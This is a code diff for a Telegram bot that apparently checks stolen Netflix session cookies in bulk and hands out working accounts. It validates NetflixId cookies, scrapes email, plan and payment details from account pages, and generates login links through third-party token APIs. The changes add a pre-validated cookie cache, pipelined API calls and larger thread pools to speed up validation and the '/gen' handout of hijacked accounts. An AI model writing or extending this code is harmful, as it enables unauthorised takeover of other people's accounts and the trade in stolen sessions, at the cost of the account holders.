@@ -205,6 +205,99 @@ GLOBAL_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=100)
 # Cookie check limits
 USER_DAILY_LIMIT = 10  # non-admin: max 10 cookie checks per day
 USER_SINGLE_ONLY = True  # non-admin: only 1 cookie per check request
+
+# ── Hot cache: pre-validated cookies ready for instant /gen ─────────────────
+# Background workers keep this list warm; /gen first tries here before scanning DB.
+_HOT_CACHE = []                           # list of {"cookie": str, "row_id": any}
+_HOT_CACHE_LOCK = threading.Lock()
+_HOT_CACHE_TARGET = 3                     # keep this many pre-validated ready
+_HOT_CACHE_REFILLING = threading.Event()
+
+def _refill_hot_cache():
+    """Background: keep _HOT_CACHE_TARGET fresh cookies ready for instant gen.
+    Dead cookies encountered during refill are purged from DB in the same pass.
+    """
+    if _HOT_CACHE_REFILLING.is_set():
+        return
+    _HOT_CACHE_REFILLING.set()
+    try:
+        # Access supabase via globals at call time (it's defined later in main flow).
+        sb = globals().get('supabase')
+        if not sb:
+            return
+        with _HOT_CACHE_LOCK:
+            need = max(0, _HOT_CACHE_TARGET - len(_HOT_CACHE))
+        if need <= 0:
+            return
+        try:
+            res = sb.table('netflix').select("*").limit(80).execute()
+        except Exception:
+            return
+        rows = list(getattr(res, 'data', None) or [])
+        if not rows:
+            return
+        random.shuffle(rows)
+        # Skip rows already in cache
+        with _HOT_CACHE_LOCK:
+            cached_ids = {it.get("row_id") for it in _HOT_CACHE}
+        rows = [r for r in rows if r.get('id') not in cached_ids]
+        dead_ids = []
+        dead_lock = threading.Lock()
+        found_lock = threading.Lock()
+        added = {"n": 0}
+
+        def _scan(row):
+            if added["n"] >= need:
+                return None
+            try:
+                c = _db_row_cookie(row)
+                if not c:
+                    with dead_lock: dead_ids.append(row.get('id'))
+                    return None
+                nid_t = parse_smart_cookie(c)
+                if not nid_t:
+                    with dead_lock: dead_ids.append(row.get('id'))
+                    return None
+                v, _ = _check_netflix_session(nid_t)
+                if not v:
+                    with dead_lock: dead_ids.append(row.get('id'))
+                    return None
+                with found_lock:
+                    if added["n"] < need:
+                        with _HOT_CACHE_LOCK:
+                            _HOT_CACHE.append({"cookie": c, "row_id": row.get('id')})
+                        added["n"] += 1
+                return None
+            except Exception:
+                return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=40) as pool:
+            futs = [pool.submit(_scan, r) for r in rows]
+            concurrent.futures.wait(futs, timeout=15)
+
+        # Purge dead rows
+        if dead_ids:
+            def _purge(ids=list(dead_ids)):
+                for _id in ids:
+                    try: sb.table('netflix').delete().eq('id', _id).execute()
+                    except: pass
+            try: GLOBAL_EXECUTOR.submit(_purge)
+            except: pass
+    finally:
+        _HOT_CACHE_REFILLING.clear()
+
+def _hot_cache_periodic():
+    """Periodically ensures the hot cache stays warm (every 90s)."""
+    while True:
+        try:
+            _refill_hot_cache()
+        except Exception:
+            pass
+        time.sleep(90)
+
+# Start periodic refiller (daemon)
+threading.Thread(target=_hot_cache_periodic, daemon=True).start()
+
 # ── FIFO Rate-Limited API Queue ─────────────────────────────────────────────
 # NFToken.site API: 1 request per 2.5 seconds, strict FIFO queue
 # iOS API: NO rate limit — used for NFToken link generation
@@ -213,36 +306,48 @@ import queue as _queue_module
 
 _API_QUEUE = _queue_module.Queue()           # FIFO queue of (event, result_holder)
 # NFToken.site strict limit: 1 request per 2 seconds per API key.
-# Use a slightly-above-limit interval to absolutely avoid RATE_LIMIT responses.
-_API_RATE_INTERVAL = 2.1                      # seconds between API calls (strict per-key limit)
+# We PIPELINE: enforce 2.05s between SUBMISSIONS (not completions) so that
+# throughput == 1 call per 2.05s regardless of concurrent waiters. This is
+# the single biggest speedup for single-cookie checks under load.
+_API_RATE_INTERVAL = 2.05                     # seconds between API submissions
 _api_queue_lock = threading.Lock()
+# Separate HTTP pool — each API call runs concurrently with the next submission
+_API_HTTP_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=16)
 
 def _api_worker():
-    """Background thread: drain FIFO queue at 1 req/2.5s."""
-    last_call = 0.0
+    """Pipelined background thread.
+    Submits queued API calls at 2.05s intervals; actual HTTP work happens in
+    _API_HTTP_EXECUTOR so waiters don't block on a previous call's response.
+    """
+    last_submit = 0.0
     while True:
         try:
             event, holder = _API_QUEUE.get(timeout=60)
-            # Enforce rate limit
             now = time.time()
-            gap = _API_RATE_INTERVAL - (now - last_call)
+            gap = _API_RATE_INTERVAL - (now - last_submit)
             if gap > 0:
                 time.sleep(gap)
-            # Execute the API call stored in holder["func"]
+            last_submit = time.time()
+
+            def _run(ev=event, h=holder):
+                try:
+                    h["result"] = h["func"]()
+                except Exception as e:
+                    h["result"] = {}
+                    h["error"] = str(e)
+                ev.set()
+
             try:
-                result = holder["func"]()
-                holder["result"] = result
-            except Exception as e:
-                holder["result"] = {}
-                holder["error"] = str(e)
-            last_call = time.time()
-            event.set()
+                _API_HTTP_EXECUTOR.submit(_run)
+            except Exception:
+                # Fallback: run inline if executor is full
+                _run()
         except _queue_module.Empty:
             continue
         except Exception:
             continue
 
-# Start one background worker thread
+# Start one background worker thread (submissions are paced here; HTTP runs in pool)
 _api_worker_thread = threading.Thread(target=_api_worker, daemon=True)
 _api_worker_thread.start()
 
@@ -254,10 +359,10 @@ def _nftoken_api_call(nid: str, key: str = None) -> dict:
     holder = {"result": {}, "func": lambda: requests.post(
         NFTOKEN_API,
         json={"key": _key, "cookie": clean},
-        timeout=12
+        timeout=10
     ).json()}
     _API_QUEUE.put((event, holder))
-    event.wait(timeout=60)  # wait up to 60s for queue slot
+    event.wait(timeout=25)  # pipelined worker: real wait is (queue_pos * 2.05) + ~2.1s api
     result = holder.get("result", {})
     return result if isinstance(result, dict) else {}
 
@@ -1331,10 +1436,11 @@ def extract_cookies_from_block(text):
 
     return results
 
-def check_cookie_script(cookie_input):
+def check_cookie_script(cookie_input, quick=False):
     """Fast SCRIPT-ONLY cookie check — NO NFToken API, NO rate limit.
     Used for bulk checking to avoid API load.  Returns dict shape same as
-    check_cookie_fast but without login links (those need API)."""
+    check_cookie_fast but without login links (those need API).
+    If quick=True, skip the extra /YourAccount request (validity only)."""
     nid = parse_smart_cookie(cookie_input)
     if not nid:
         return {"valid": False}
@@ -1358,13 +1464,13 @@ def check_cookie_script(cookie_input):
                 deep_data = parsed
         except Exception:
             pass
-    # Fetch /YourAccount once for richer details (no API)
-    if deep_data.get("email") == "N/A":
+    # Fetch /YourAccount once for richer details (no API) — skipped in quick mode
+    if not quick and deep_data.get("email") == "N/A":
         try:
             with requests.Session() as s:
                 s.headers.update(HEADERS)
                 s.cookies.set("NetflixId", nid, domain=".netflix.com")
-                r = s.get("https://www.netflix.com/YourAccount", timeout=6, allow_redirects=True)
+                r = s.get("https://www.netflix.com/YourAccount", timeout=5, allow_redirects=True)
                 if r.status_code == 200 and "login" not in str(r.url).lower():
                     parsed = extract_deep_details(r.text)
                     if any(v not in ("Unknown", "N/A", "No ❌", "", []) for v in parsed.values()):
@@ -1387,29 +1493,59 @@ def check_cookie_fast(cookie_input, api_key=None):
     clean_cookie = f"NetflixId={nid}"
     key = (api_key or NFTOKEN_KEY or "").strip()
 
-    # ── 1. Try NFTOKEN API via FIFO rate-limited queue ────────────────────
-    api_res = {}
-    api_success = False
-    if key and not _api_circuit_open():
+    # ── PARALLEL: direct Netflix check + NFToken API fire simultaneously ──
+    # Big speedup: dead cookies return in ~1-2s (no waiting on slow API queue).
+    # Valid cookies still get full API links/data because we then wait on API.
+    direct_box = {"valid": None, "html": None}
+    api_box = {"res": {}}
+
+    def _do_direct():
         try:
-            api_res = _nftoken_api_call(nid, key)
-            if isinstance(api_res, dict) and api_res.get("status") == "SUCCESS":
-                api_success = True
-                _api_record_success()
-            elif isinstance(api_res, dict) and api_res.get("status") in ("RATE_LIMIT", "ERROR"):
-                _api_record_failure()
+            v, h = _check_netflix_session(nid)
+            direct_box["valid"] = bool(v)
+            direct_box["html"] = h
+        except Exception:
+            direct_box["valid"] = False
+
+    def _do_api():
+        if not key or _api_circuit_open():
+            return
+        try:
+            r = _nftoken_api_call(nid, key)
+            if isinstance(r, dict):
+                api_box["res"] = r
+                if r.get("status") == "SUCCESS":
+                    _api_record_success()
+                elif r.get("status") in ("RATE_LIMIT", "ERROR"):
+                    _api_record_failure()
         except Exception:
             _api_record_failure()
 
-    # ── 2. Fallback: direct Netflix session check ─────────────────────────
-    # If the API didn't confirm validity (rate-limited, key expired, or any
-    # error), hit Netflix directly.  This is the same check every other
-    # cookie-checker bot uses and is unaffected by API issues.
-    direct_html = None
-    if not api_success:
-        direct_valid, direct_html = _check_netflix_session(nid)
-        if not direct_valid:
+    t_dir = threading.Thread(target=_do_direct, daemon=True)
+    t_api = threading.Thread(target=_do_api, daemon=True)
+    t_dir.start()
+    t_api.start()
+    # Direct check is fast (0.5-2s). Wait for it first.
+    t_dir.join(timeout=8)
+
+    api_success = (isinstance(api_box.get("res"), dict) and api_box["res"].get("status") == "SUCCESS")
+
+    # If direct says dead AND API hasn't already said SUCCESS, declare dead NOW.
+    # Don't wait on slow API queue for dead cookies.
+    if direct_box["valid"] is False and not api_success:
+        # Brief grace period: if api was about to succeed, give 1s
+        t_api.join(timeout=1)
+        api_res = api_box.get("res", {})
+        if not (isinstance(api_res, dict) and api_res.get("status") == "SUCCESS"):
             return {"valid": False}
+
+    # Cookie looks valid — wait for API (links) but with bounded timeout
+    t_api.join(timeout=12)
+    api_res = api_box.get("res", {})
+    if not isinstance(api_res, dict):
+        api_res = {}
+    api_success = api_res.get("status") == "SUCCESS"
+    direct_html = direct_box.get("html")
 
     # ── 3. Extract account details ────────────────────────────────────────
     deep_data = {
@@ -1420,21 +1556,27 @@ def check_cookie_fast(cookie_input, api_key=None):
         "max_streams": "Unknown", "email_verified": "No ❌", "phone_verified": "No ❌",
         "auto_payment": "No ❌"
     }
-    # Netflix /browse is a React SPA shell — it never contains account JSON.
-    # Always fetch /YourAccount which embeds falcorCache JSON with plan/email/etc.
-    try:
-        with requests.Session() as session:
-            session.headers.update(HEADERS)
-            session.cookies.set("NetflixId", nid, domain=".netflix.com")
-            acc_resp = session.get("https://www.netflix.com/YourAccount", timeout=8, allow_redirects=True)
-            # If redirected to login, cookie expired between the two checks
-            if "login" not in str(acc_resp.url).lower() and acc_resp.status_code == 200:
-                parsed = extract_deep_details(acc_resp.text)
-                # Only use if we got at least one real field
-                if any(v not in ("Unknown", "N/A", "No ❌", "", []) for v in parsed.values()):
-                    deep_data = parsed
-    except:
-        pass
+    # Try /browse HTML first (already fetched during direct check — no extra request)
+    if direct_html:
+        try:
+            parsed = extract_deep_details(direct_html)
+            if any(v not in ("Unknown", "N/A", "No ❌", "", []) for v in parsed.values()):
+                deep_data = parsed
+        except Exception:
+            pass
+    # Fallback: /YourAccount (contains falcorCache JSON) — only if still empty
+    if deep_data.get("email") == "N/A":
+        try:
+            with requests.Session() as session:
+                session.headers.update(HEADERS)
+                session.cookies.set("NetflixId", nid, domain=".netflix.com")
+                acc_resp = session.get("https://www.netflix.com/YourAccount", timeout=6, allow_redirects=True)
+                if "login" not in str(acc_resp.url).lower() and acc_resp.status_code == 200:
+                    parsed = extract_deep_details(acc_resp.text)
+                    if any(v not in ("Unknown", "N/A", "No ❌", "", []) for v in parsed.values()):
+                        deep_data = parsed
+        except Exception:
+            pass
 
     # Fill gaps from API data (when API succeeded it may have extra fields)
     if isinstance(api_res, dict):
@@ -1449,7 +1591,7 @@ def check_cookie_fast(cookie_input, api_key=None):
     api_link2 = api_res.get("x_l2") if isinstance(api_res, dict) else None
     api_link3 = api_res.get("x_l3") if isinstance(api_res, dict) else None
 
-    # Generate NFToken via iOS API (no rate limit!) as primary link source
+    # Generate NFToken via iOS API (no rate limit!) in parallel with the rest
     ios_link1 = ios_link2 = ios_link3 = ios_exp = None
     try:
         ios_token, ios_exp = gen_ios_nftoken(nid)
@@ -1480,31 +1622,56 @@ def check_cookie(cookie_input, get_screenshot=False):
     # Normalize: always send clean NetflixId=value to API
     clean_cookie = f"NetflixId={nid}"
 
-    # 1. Try NFTOKEN API (bonus: provides login links) — skip when circuit open
-    api_res = {}
-    api_success = False
-    if not _api_circuit_open():
+    # ── PARALLEL: direct Netflix check + NFToken API fire simultaneously ──
+    direct_box = {"valid": None, "html": None}
+    api_box = {"res": {}}
+
+    def _do_direct():
         try:
-            api_res = _nftoken_api_call(nid, NFTOKEN_KEY)
-            if isinstance(api_res, dict) and api_res.get("status") == "SUCCESS":
-                _api_record_success()
-                api_success = True
-            else:
-                _api_record_failure()
+            v, h = _check_netflix_session(nid)
+            direct_box["valid"] = bool(v)
+            direct_box["html"] = h
+        except Exception:
+            direct_box["valid"] = False
+
+    def _do_api():
+        if _api_circuit_open():
+            return
+        try:
+            r = _nftoken_api_call(nid, NFTOKEN_KEY)
+            if isinstance(r, dict):
+                api_box["res"] = r
+                if r.get("status") == "SUCCESS":
+                    _api_record_success()
+                else:
+                    _api_record_failure()
         except Exception:
             _api_record_failure()
 
-    # 2. Fallback: direct Netflix session check when API doesn't confirm validity
-    direct_html = None
-    if not api_success:
-        direct_valid, direct_html = _check_netflix_session(nid)
-        if not direct_valid:
-            msg = api_res.get("message", "Dead Cookie") if isinstance(api_res, dict) else "Dead Cookie"
+    t_dir = threading.Thread(target=_do_direct, daemon=True)
+    t_api = threading.Thread(target=_do_api, daemon=True)
+    t_dir.start()
+    t_api.start()
+    t_dir.join(timeout=8)
+
+    api_res = api_box.get("res", {}) if isinstance(api_box.get("res"), dict) else {}
+    api_success = api_res.get("status") == "SUCCESS"
+
+    if direct_box["valid"] is False and not api_success:
+        t_api.join(timeout=1)
+        api_res = api_box.get("res", {}) if isinstance(api_box.get("res"), dict) else {}
+        if api_res.get("status") != "SUCCESS":
+            msg = api_res.get("message", "Dead Cookie") if api_res else "Dead Cookie"
             return {"valid": False, "msg": msg}
 
-    api_link  = api_res.get("x_l1") or api_res.get("login_url") if isinstance(api_res, dict) else None
-    api_link2 = api_res.get("x_l2") if isinstance(api_res, dict) else None
-    api_link3 = api_res.get("x_l3") if isinstance(api_res, dict) else None
+    # Valid — wait bounded time for API (for links)
+    t_api.join(timeout=12)
+    api_res = api_box.get("res", {}) if isinstance(api_box.get("res"), dict) else {}
+    direct_html = direct_box.get("html")
+
+    api_link  = api_res.get("x_l1") or api_res.get("login_url")
+    api_link2 = api_res.get("x_l2")
+    api_link3 = api_res.get("x_l3")
 
     # iOS NFToken links (no rate limit — runs in parallel)
     ios_link1 = ios_link2 = ios_link3 = ios_exp = None
@@ -1529,19 +1696,23 @@ def check_cookie(cookie_input, get_screenshot=False):
         "max_streams": "Unknown", "email_verified": "No ❌", "phone_verified": "No ❌",
         "auto_payment": "No ❌"
     }
-    # Reuse already-fetched HTML from the fallback check to save a request
+    # Reuse already-fetched HTML from the direct check to save a request
     if direct_html:
         try:
-            deep_data = extract_deep_details(direct_html)
+            parsed = extract_deep_details(direct_html)
+            if any(v not in ("Unknown", "N/A", "No ❌", "", []) for v in parsed.values()):
+                deep_data = parsed
         except:
             pass
-    else:
+    if deep_data.get("email") == "N/A":
         try:
             with requests.Session() as session:
                 session.headers.update(HEADERS)
                 session.cookies.set("NetflixId", nid, domain=".netflix.com")
                 acc_resp = session.get("https://www.netflix.com/YourAccount", timeout=6)
-                deep_data = extract_deep_details(acc_resp.text)
+                parsed = extract_deep_details(acc_resp.text)
+                if any(v not in ("Unknown", "N/A", "No ❌", "", []) for v in parsed.values()):
+                    deep_data = parsed
         except:
             pass
 
@@ -1554,7 +1725,8 @@ def check_cookie(cookie_input, get_screenshot=False):
         if deep_data["member_since"] == "Unknown": deep_data["member_since"] = api_res.get("x_mem",  "Unknown")
 
     screenshot_bytes = None
-    if get_screenshot and _PLAYWRIGHT_OK and SCREENSHOT_SEMAPHORE.acquire(timeout=6):
+    # Screenshots are expensive (~5-10s). Disabled by default for speed.
+    if get_screenshot and _PLAYWRIGHT_OK and SCREENSHOT_SEMAPHORE.acquire(timeout=3):
         try:
             with _sync_playwright() as p:
                 browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
@@ -1563,7 +1735,7 @@ def check_cookie(cookie_input, get_screenshot=False):
                 pg = ctx.new_page()
                 pg.goto("https://www.netflix.com/browse", timeout=6000, wait_until="domcontentloaded")
                 try:
-                    pg.wait_for_timeout(800)
+                    pg.wait_for_timeout(600)
                 except Exception:
                     pass
                 try:
@@ -2514,7 +2686,8 @@ def main():
                 # Abort immediately if admin pressed Emergency Stop
                 if _ac_sessions.get(message.chat.id, {}).get("stopped"):
                     return "skipped"
-                chk = check_cookie_script(cookie)
+                # Quick mode: validity only (skip /YourAccount) — 2x faster
+                chk = check_cookie_script(cookie, quick=True)
                 if chk.get('valid'):
                     try:
                         nid_val = parse_smart_cookie(cookie)
@@ -2551,7 +2724,7 @@ def main():
                         return "error"
                 return "dead"
 
-            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=60) as pool:
                 futures = {pool.submit(_check_and_save, c): c for c in candidates}
                 skipped_count = 0
                 for future in concurrent.futures.as_completed(futures):
@@ -3794,7 +3967,7 @@ def main():
 
         # Use send_message (not reply_to) so this works when called from gen_retry
         # after the original button message has already been deleted.
-        status_msg = bot.send_message(message.chat.id, "⏳ **Fetching Account from Database...**", parse_mode='Markdown')
+        status_msg = bot.send_message(message.chat.id, "⚡ **Fetching Account...**", parse_mode='Markdown')
         if not supabase:
             return bot.edit_message_text("❌ **Database not configured.**\nContact the admin.", message.chat.id, status_msg.message_id, parse_mode='Markdown')
 
@@ -3802,9 +3975,43 @@ def main():
         smsg_id = status_msg.message_id
 
         def _do_generate(cid=chat_id, sid=smsg_id):
+            # ── 1. Hot-cache fast path (pre-validated cookies) ────────────
+            cached = None
+            with _HOT_CACHE_LOCK:
+                while _HOT_CACHE:
+                    item = _HOT_CACHE.pop(0)
+                    cached = item
+                    break
+            # Kick a background refill regardless
+            GLOBAL_EXECUTOR.submit(_refill_hot_cache)
+
+            if cached:
+                try:
+                    valid_cookie = cached["cookie"]
+                    # Delete the used row from DB
+                    if cached.get("row_id"):
+                        try: supabase.table('netflix').delete().eq('id', cached['row_id']).execute()
+                        except: pass
+                    # Get full details (links + data) — fast path, no screenshot
+                    valid_acc = check_cookie_fast(valid_cookie)
+                    if valid_acc.get("valid"):
+                        try: bot.delete_message(cid, sid)
+                        except: pass
+                        send_hit(cid, valid_acc, valid_cookie, "Gen", include_screenshot=False)
+                        swap_markup = types.InlineKeyboardMarkup()
+                        swap_markup.add(types.InlineKeyboardButton("🔄 Change Account", callback_data="gen_retry"))
+                        summary = build_hits_txt([(valid_acc, valid_cookie)], title="NETFLIX GENERATED ACCOUNT")
+                        with io.BytesIO(summary.encode('utf-8')) as f:
+                            f.name = f"Netflix_Account_{datetime.now().strftime('%Y%m%d')}.txt"
+                            bot.send_document(cid, f, caption="📂 **Generated Account Details**\n\n👇 Not satisfied? Tap below to get another account.", reply_markup=swap_markup)
+                        return
+                except Exception as e:
+                    print(f"[Gen] hot-cache path error: {e}")
+                # fall through to live scan
+
+            # ── 2. Live scan path — fetch batch and parallel-validate ─────
             try:
-                # Fetch a small batch first (fast). We'll scan in parallel and auto-delete dead rows.
-                res = supabase.table('netflix').select("*").limit(50).execute()
+                res = supabase.table('netflix').select("*").limit(100).execute()
             except Exception as e:
                 bot.edit_message_text(f"❌ **Database Error.**\n`{e}`", cid, sid, parse_mode='Markdown')
                 return
@@ -3822,16 +4029,18 @@ def main():
             valid_cookie = None
             valid_row_id = None
             valid_nid = None
-            # Fast-validate cookies without Playwright (1-2s each instead of 10-15s).
-            # Auto-delete dead cookies from DB in parallel so pool stays clean.
             rows = list(res.data or [])
             random.shuffle(rows)
             dead_ids = []
             dead_lock = threading.Lock()
+            stop_event = threading.Event()
+            winner_holder = {"val": None}
+            winner_lock = threading.Lock()
 
             def _find_valid(row):
+                if stop_event.is_set(): return None
                 c = _db_row_cookie(row)
-                if not c: 
+                if not c:
                     with dead_lock:
                         dead_ids.append(row.get('id'))
                     return None
@@ -3840,24 +4049,29 @@ def main():
                     with dead_lock:
                         dead_ids.append(row.get('id'))
                     return None
-                # Quick validity check first (~0.5s) — skip deep scrape until we find a winner
+                if stop_event.is_set(): return None
                 valid_q, _ = _check_netflix_session(nid_t)
                 if not valid_q:
                     with dead_lock:
                         dead_ids.append(row.get('id'))
                     return None
+                # First valid wins — stop others
+                with winner_lock:
+                    if winner_holder["val"] is None:
+                        winner_holder["val"] = (c, row.get('id'), nid_t)
+                        stop_event.set()
                 return (c, row.get('id'), nid_t)
 
-            # Parallel validity scan — 30 threads, finishes scan of 50 cookies in ~2s
-            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as _pool:
-                for _r in _pool.map(_find_valid, rows[:50]):
-                    if _r and not valid_cookie:
-                        valid_cookie, valid_row_id, valid_nid = _r
-                        # Remove the winner row so next user doesn't get the same account
-                        if valid_row_id:
-                            try: supabase.table('netflix').delete().eq('id', valid_row_id).execute()
-                            except: pass
-                        break
+            # Parallel validity scan — 50 threads for ~1-2s total
+            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as _pool:
+                futs = [_pool.submit(_find_valid, r) for r in rows[:100]]
+                concurrent.futures.wait(futs, timeout=12)
+
+            if winner_holder["val"]:
+                valid_cookie, valid_row_id, valid_nid = winner_holder["val"]
+                if valid_row_id:
+                    try: supabase.table('netflix').delete().eq('id', valid_row_id).execute()
+                    except: pass
 
             # Background-delete dead rows so DB stays clean (non-blocking)
             if dead_ids:
@@ -3867,48 +4081,19 @@ def main():
                         except: pass
                 GLOBAL_EXECUTOR.submit(_purge_dead)
 
-            # Now do a FULL check (with API links xl1/xl2/xl3) for the winner
+            # Full fast check for the winner (NO screenshot, NO Playwright — saves 5-10s)
             if valid_cookie:
                 try:
                     valid_acc = check_cookie_fast(valid_cookie)
                     if not valid_acc.get("valid"):
-                        valid_acc = check_cookie_script(valid_cookie)  # final fallback
+                        valid_acc = check_cookie_script(valid_cookie)
                 except Exception:
                     valid_acc = check_cookie_script(valid_cookie)
 
-            if valid_acc:
-                # Take screenshot for the valid cookie (best-effort, reduced timeouts)
-                if valid_nid and _PLAYWRIGHT_OK and SCREENSHOT_SEMAPHORE.acquire(timeout=8):
-                    try:
-                        with _sync_playwright() as p:
-                            browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
-                            ctx = browser.new_context(viewport={'width': 1280, 'height': 720}, java_script_enabled=True)
-                            ctx.add_cookies([{'name': 'NetflixId', 'value': valid_nid, 'domain': '.netflix.com', 'path': '/'}])
-                            pg = ctx.new_page()
-                            pg.goto("https://www.netflix.com/browse", timeout=6000, wait_until="domcontentloaded")
-                            try: pg.wait_for_timeout(800)
-                            except Exception: pass
-                            try:
-                                content = pg.content()
-                                pw_profiles = re.findall(r'class="profile-name">([^<]+)<', content)
-                                if pw_profiles and isinstance(valid_acc.get('data'), dict):
-                                    profiles = list(set([clean_text(pr) for pr in pw_profiles]))
-                                    profiles = [pr for pr in profiles if pr not in ["Add Profile", "Add", "New Profile", "add-profile"]]
-                                    if profiles:
-                                        valid_acc['data']['profiles'] = profiles
-                            except Exception: pass
-                            valid_acc['screenshot'] = pg.screenshot(type='jpeg', quality=60)
-                            browser.close()
-                    except Exception as se:
-                        print(f"[Gen] Screenshot error: {se}")
-                    finally:
-                        SCREENSHOT_SEMAPHORE.release()
-
-            if valid_acc:
+            if valid_acc and valid_acc.get("valid"):
                 try: bot.delete_message(cid, sid)
                 except: pass
-                send_hit(cid, valid_acc, valid_cookie, "Gen", include_screenshot=True)
-                # "Change Account" button lets users swap to another DB account
+                send_hit(cid, valid_acc, valid_cookie, "Gen", include_screenshot=False)
                 swap_markup = types.InlineKeyboardMarkup()
                 swap_markup.add(types.InlineKeyboardButton("🔄 Change Account", callback_data="gen_retry"))
                 summary = build_hits_txt([(valid_acc, valid_cookie)], title="NETFLIX GENERATED ACCOUNT")
@@ -4047,62 +4232,53 @@ def main():
 
             # Single Cookie Animation Logic
             if not is_bulk:
-                status_msg = bot.reply_to(message, "⏳ **Initializing...**", parse_mode='Markdown')
-                
-                # Animation Thread
+                status_msg = bot.reply_to(message, "⚡ **Checking cookie...**", parse_mode='Markdown')
+
+                # Light animation: 1 edit every 2.5s (not every 0.8s) — avoids
+                # wasting Telegram API slots that slow down real work.
                 def animate_check():
-                    animations = [
-                        "🌑 🌒 🌓 🌔 🌕 🌖 🌗 🌘",
-                        "⣾ ⣽ ⣻ ⢿ ⡿ ⣟ ⣯ ⣷",
-                        "⚡ 🔌 💡 🔋 🔌 ⚡",
-                        "💾 💿 📀 📼 📷 📺"
-                    ]
                     messages = [
-                        "🚀 **Connecting to Netflix...**",
-                        "🔑 **Decrypting Session Token...**",
-                        "🌍 **Bypassing Geo-Block...**",
-                        "🔍 **Scanning Account Data...**",
-                        "💎 **Checking Subscription...**",
-                        "💳 **Verifying Payment Info...**"
+                        "🔑 **Decrypting session...**",
+                        "🌍 **Validating with Netflix...**",
+                        "🔗 **Generating access tokens...**",
+                        "💎 **Almost done...**",
                     ]
                     i = 0
                     while getattr(status_msg, "keep_animating", True):
                         if user_modes.get(message.chat.id, {}).get('stop'):
                             break
                         try:
-                            msg_idx = (i // 2) % len(messages)
-                            anim_set_idx = (i // 6) % len(animations)
-                            anim_frames = animations[anim_set_idx].split()
-                            frame = anim_frames[i % len(anim_frames)]
-                            percent = min((i * 8) % 100, 99)
-                            bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
-                            
-                            bot.edit_message_text(f"{frame} {messages[msg_idx]}\n`[{bar}] {percent}%`", message.chat.id, status_msg.message_id, parse_mode='Markdown')
+                            bot.edit_message_text(
+                                f"{messages[i % len(messages)]}",
+                                message.chat.id, status_msg.message_id,
+                                parse_mode='Markdown'
+                            )
                             i += 1
-                            time.sleep(0.8)
-                        except: break
-                
+                            time.sleep(2.5)
+                        except:
+                            break
+
                 status_msg.keep_animating = True
                 threading.Thread(target=animate_check, daemon=True).start()
-                
+
                 start_t = time.time()
-                # Full check with screenshot — result + screenshot sent together in one message
-                res = check_cookie(valid_cookies[0], get_screenshot=False)  # Screenshots disabled for speed
+                # Use check_cookie_fast (parallel direct+API, no Playwright) — fastest path
+                res = check_cookie_fast(valid_cookies[0])
                 status_msg.keep_animating = False
-                
+
                 try: bot.delete_message(message.chat.id, status_msg.message_id)
                 except: pass
-                
-                if res["valid"]:
-                    send_hit(mode['target'], res, valid_cookies[0], round(time.time() - start_t, 2), include_screenshot=True, add_back_button=True)
+
+                if res.get("valid"):
+                    send_hit(mode['target'], res, valid_cookies[0], round(time.time() - start_t, 2), include_screenshot=False, add_back_button=True)
                 else:
-                    bot.reply_to(message, f"❌ **Invalid Cookie**\nReason: {res.get('msg', 'Unknown')}")
+                    bot.reply_to(message, f"❌ **Invalid Cookie**\nReason: {res.get('msg', 'Dead Cookie')}")
                 return
 
             def background_checker(cookies, chat_id, target, send_file, limit_warning, is_privileged):
                 # Bulk uses SCRIPT-ONLY checker (no NFToken API) for speed and
-                # to avoid rate-limiting.  Increased threads for fast parallel scan.
-                BULK_THREADS = 50
+                # to avoid rate-limiting.  100 threads for fast parallel scan.
+                BULK_THREADS = 100
 
                 def _bulk_controls():
                     m = types.InlineKeyboardMarkup()
